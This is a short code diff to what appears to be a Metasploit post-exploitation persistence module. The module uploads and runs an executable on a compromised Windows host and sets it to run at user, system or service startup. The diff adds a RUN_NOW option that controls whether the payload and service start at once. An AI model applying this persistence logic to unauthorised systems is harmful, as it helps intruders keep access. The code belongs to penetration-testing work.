@@ -29,7 +29,8 @@ class MetasploitModule < Msf::Post
       [
         OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER', 'SYSTEM', 'SERVICE']]),
         OptPath.new('REXEPATH', [true, 'The remote executable to upload and execute.']),
-        OptString.new('REXENAME', [true, 'The name to call exe on remote system', 'default.exe'])
+        OptString.new('REXENAME', [true, 'The name to call exe on remote system', 'default.exe']),
+        OptBool.new('RUN_NOW', [false, 'Run the installed payload immediately.', true]),
       ], self.class
     )
 
@@ -59,7 +60,7 @@ class MetasploitModule < Msf::Post
     script_on_target = write_exe_to_target(raw, rexename)
 
     # Initial execution of script
-    target_exec(script_on_target)
+    target_exec(script_on_target) if datastore['RUN_NOW']
 
     case datastore['STARTUP']
     when /USER/i
@@ -154,7 +155,7 @@ class MetasploitModule < Msf::Post
       end
 
       # if service is stopped, then start it.
-      service_start(nam) if service_status(nam)[:state] == 1
+      service_start(nam) if datastore['RUN_NOW'] and service_status(nam)[:state] == 1
 
       @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
     else
